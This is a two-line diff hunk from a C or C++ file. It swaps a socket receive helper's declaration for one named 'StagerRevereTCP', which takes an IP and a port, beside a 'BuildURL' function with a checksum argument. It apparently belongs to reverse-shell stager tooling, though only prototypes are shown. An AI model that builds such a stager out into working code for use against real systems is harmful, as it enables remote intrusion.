@@ -47,4 +47,4 @@ void usage();
 void BuildURL(char *url, int checksum8);
 
 
-int recv_all(SOCKET socket, unsigned char* buffer, int len);
+void StagerRevereTCP(wchar_t* IP, wchar_t* iPort);
